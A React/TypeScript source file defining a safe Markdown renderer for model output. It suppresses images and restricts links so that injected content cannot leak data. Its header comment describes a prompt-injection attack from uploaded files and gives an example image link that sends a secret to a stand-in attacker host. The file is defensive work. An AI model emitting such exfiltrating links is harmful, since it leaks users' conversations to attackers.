"use client";

import { isValidElement, useState, type ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { Check, Copy } from "lucide-react";

/**
 * Markdown renderer for model output.
 *
 * Answers are generated from untrusted text (uploaded documents, imported repos), so a hostile file
 * can try to make the model emit a Markdown image such as ![x](https://evil.example/?q=<secret>):
 * the browser would fetch it automatically and leak the conversation. Images are therefore never
 * rendered, and links open only if they are http(s) or mailto, in a new tab with no referrer.
 */

function textOf(node: ReactNode): string {
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (isValidElement<{ children?: ReactNode }>(node)) return textOf(node.props.children);
  return "";
}

function CodeBlock({ children }: { children?: ReactNode }) {
  const [copied, setCopied] = useState(false);
  const code = textOf(children).replace(/\n$/, "");
  const language = isValidElement<{ className?: string }>(children)
    ? /language-([\w+#-]+)/.exec(children.props.className ?? "")?.[1]
    : undefined;

  const copy = async () => {
    try {
      await navigator.clipboard.writeText(code);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      // clipboard unavailable (insecure context); nothing useful to do
    }
  };

  return (
    <div className="not-prose my-3 overflow-hidden rounded-lg border bg-muted/40">
      <div className="flex items-center justify-between border-b bg-muted/60 px-3 py-1 text-xs text-muted-foreground">
        <span>{language ?? "code"}</span>
        <button
          type="button"
          onClick={copy}
          className="flex items-center gap-1 rounded px-1.5 py-0.5 transition-colors hover:text-foreground"
          aria-label="Copy code"
        >
          {copied ? <Check className="size-3 text-emerald-500" /> : <Copy className="size-3" />}
          {copied ? "Copied" : "Copy"}
        </button>
      </div>
      <pre className="overflow-x-auto p-3 text-xs leading-relaxed">{children}</pre>
    </div>
  );
}

const SAFE_LINK = /^(https?:|mailto:)/i;

const components: Components = {
  img: ({ alt }) => (
    <span className="text-xs italic text-muted-foreground">[image not shown{alt ? `: ${alt}` : ""}]</span>
  ),
  a: ({ href, children }) =>
    href && SAFE_LINK.test(href) ? (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer nofollow"
        referrerPolicy="no-referrer"
        title={href}
        className="text-primary underline underline-offset-2"
      >
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
};

export function SafeMarkdown({ children }: { children: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
      {children}
    </ReactMarkdown>
  );
}
